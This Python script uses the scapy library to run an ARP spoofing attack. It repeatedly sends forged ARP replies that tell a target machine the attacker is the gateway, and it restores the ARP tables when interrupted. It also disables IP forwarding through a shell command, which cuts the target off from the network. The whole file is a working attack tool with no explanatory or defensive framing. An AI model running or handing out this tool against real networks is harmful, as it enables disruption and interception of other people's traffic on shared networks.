#!usr/bin/env python

import scapy.all as scapy
import sys
import time
import argparse
import subprocess


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast / arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)
    return


def spoofR(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    #print(target_mac)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, count=4, verbose=False)


def spoofT(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    #print(target_mac)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, count=4, verbose=False)


def start(target_ip, gateway_ip):
    packets = 0
    try:
        while True:
            spoofT(target_ip, gateway_ip)
            #spoofR(gateway_ip, target_ip)
            packets = packets + 4
            print("\r[+] Packets send : " + str(packets), end=""),
            sys.stdout.flush()
            time.sleep(0.8)
    except KeyboardInterrupt:
        print("\n[+] Exiting and Resetting ARP Table.....")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)


def argument():
    par = argparse.ArgumentParser()
    par.add_argument("-t", "--target", dest="target", help="IP address of Target computer")
    par.add_argument("-d", "-r", "-s", "--spoof", dest="spoof", help="IP address of Router/Gateway")
    options = par.parse_args()
    start(options.target, options.spoof)

subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
argument()
'''
try:
    
except:
    print("[-] Recheck the input")'''
